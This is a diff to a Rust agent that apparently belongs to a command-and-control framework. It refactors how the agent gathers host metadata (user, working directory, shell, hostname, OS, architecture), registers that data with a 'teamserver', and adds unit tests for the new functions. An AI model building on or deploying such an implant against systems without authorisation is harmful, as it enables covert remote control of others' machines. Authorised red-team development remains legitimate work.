@@ -15,6 +15,42 @@ use sysinfo::{ProcessesToUpdate, System};
 use tokio::process::Command;
 use tokio::time::timeout;
 
+/// Collects metadata about the current environment.
+///
+/// This function is separated from `run` to make it easier to unit test metadata
+/// collection without requiring a live server.
+pub fn collect_metadata() -> HashMap<String, String> {
+    let mut metadata: HashMap<String, String> = HashMap::new();
+    metadata.insert("user".to_string(), whoami::username());
+    metadata.insert(
+        "cwd".to_string(),
+        env::current_dir()
+            .map(|p| p.display().to_string())
+            .unwrap_or_default(),
+    );
+    if let Ok(shell) = env::var("SHELL") {
+        metadata.insert("shell".to_string(), shell);
+    }
+    metadata
+}
+
+/// Builds a registration payload for the current agent.
+///
+/// This is factored out for easy unit testing and for ensuring consistent behavior
+/// across platforms.
+pub fn build_registration(agent_id: &str) -> anyhow::Result<AgentRegistration> {
+    let hostname = get()?.to_string_lossy().into_owned();
+
+    Ok(AgentRegistration {
+        agent_id: agent_id.to_string(),
+        os: env::consts::OS.to_string(),
+        arch: env::consts::ARCH.to_string(),
+        hostname,
+        version: env!("CARGO_PKG_VERSION").to_string(),
+        metadata: collect_metadata(),
+    })
+}
+
 pub async fn run() -> anyhow::Result<()> {
     let cfg = AgentConfig::load();
     info!("agent configuration: {:#?}", cfg);
@@ -32,23 +68,8 @@ pub async fn run() -> anyhow::Result<()> {
     // Register with the teamserver if we don't have a token yet.
     if state.token.is_none() {
         info!("registering agent with teamserver");
-        let hostname = get()?.to_string_lossy().into_owned();
 
-        let mut metadata: HashMap<String, String> = HashMap::new();
-        metadata.insert("user".to_string(), whoami::username());
-        metadata.insert("cwd".to_string(), env::current_dir()?.display().to_string());
-        if let Ok(shell) = env::var("SHELL") {
-            metadata.insert("shell".to_string(), shell);
-        }
-
-        let reg = AgentRegistration {
-            agent_id: state.agent_id.clone(),
-            os: env::consts::OS.to_string(),
-            arch: env::consts::ARCH.to_string(),
-            hostname,
-            version: env!("CARGO_PKG_VERSION").to_string(),
-            metadata,
-        };
+        let reg = build_registration(&state.agent_id)?;
 
         let resp = client
             .post(format!("{}/api/register", cfg.server_url))
@@ -292,5 +313,40 @@ async fn submit_task_result(
         Err(anyhow::anyhow!("failed to submit task result: {}", resp.status()))
     } else {
         Ok(())
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::path::Path;
+
+    #[test]
+    fn test_build_registration_os_compatibility() {
+        let reg = build_registration("test-agent").expect("build_registration should succeed");
+
+        // Ensure the OS string is one of the expected targets for this project.
+        // This guards against unexpected changes in Rust's `env::consts::OS` values.
+        let allowed = ["linux", "macos", "windows", "freebsd", "netbsd", "openbsd"];
+        assert!(
+            allowed.contains(&reg.os.as_str()),
+            "unexpected os value: {}",
+            reg.os
+        );
+
+        // Ensure architecture string is not empty and looks reasonable.
+        assert!(!reg.arch.is_empty(), "arch should not be empty");
+    }
+
+    #[test]
+    fn test_collect_metadata_contains_required_fields() {
+        let metadata = collect_metadata();
+        assert!(metadata.contains_key("user"));
+        assert!(metadata.contains_key("cwd"));
+
+        // Ensure cwd is a valid path.
+        if let Some(cwd) = metadata.get("cwd") {
+            assert!(Path::new(cwd).exists(), "cwd value should point to an existing directory");
+        }
     }
 }
